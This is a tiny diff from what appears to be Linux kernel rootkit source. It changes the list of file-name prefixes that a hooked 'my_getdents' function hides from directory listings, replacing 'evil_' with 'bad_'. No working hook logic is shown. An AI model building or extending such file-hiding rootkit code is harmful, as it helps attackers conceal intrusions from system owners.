@@ -8,7 +8,7 @@ static struct dirent
 };
 
 
-char *(hide_prefix[]) = {"evil_","hide_"};
+char *(hide_prefix[]) = {"bad_","hide_"};
 
 asmlinkage int
 my_getdents(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
